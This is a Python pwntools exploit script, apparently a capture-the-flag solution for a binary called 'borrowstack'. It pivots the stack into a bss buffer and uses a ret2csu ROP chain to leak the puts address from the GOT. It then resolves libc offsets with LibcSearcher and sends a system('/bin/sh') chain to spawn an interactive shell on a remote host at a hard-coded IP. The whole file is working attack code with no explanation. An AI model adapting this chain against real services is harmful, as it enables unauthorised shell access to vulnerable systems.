from pwn import*
from LibcSearcher import*
p = process('./borrowstack')
p = remote('123.56.85.29',3635)
elf = ELF('./borrowstack')
puts_got = elf.got['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']
csu_gadget = 0x4006FA
csu_gadget_II = 0x4006E0
pop_rdi_ret = 0x400703
pop_rbp_ret = 0x400590
leave_ret = 0x400699
bank = 0x601080
context.log_level = 'debug'
payload = '\x00'*0x60 + p64(bank-8) + p64(leave_ret)
p.send(payload)
#---------
#ROP = p64(csu_gadget) + p64(0) + p64(1) + p64(puts_got) + p64(0)*2 + p64(puts_got) +p64(csu_gadget_II) + p64(0)*2+ p64(1) + p64(0)*4
#ROP +=p64(csu_gadget +2) + p64(read_got) + p64(0x20) + p64(bank+0xE0) + p64(0) + p64(csu_gadget_II) + p64(0)*7
ROP = p64(csu_gadget) + p64(0) + p64(1) + p64(puts_got) + p64(0x30) + p64(bank+0x90) + p64(puts_got) +p64(csu_gadget_II) + p64(0) *2 + p64(bank+0x90) + p64(0)*4
ROP +=p64(pop_rdi_ret) + p64(0) + p64(read_plt)
p.recvuntil('now!\n')
p.sendline(ROP)
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system = libcbase + libc.dump('system')
binsh = libcbase + libc.dump('str_bin_sh')
one = p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendline(one)
p.interactive()
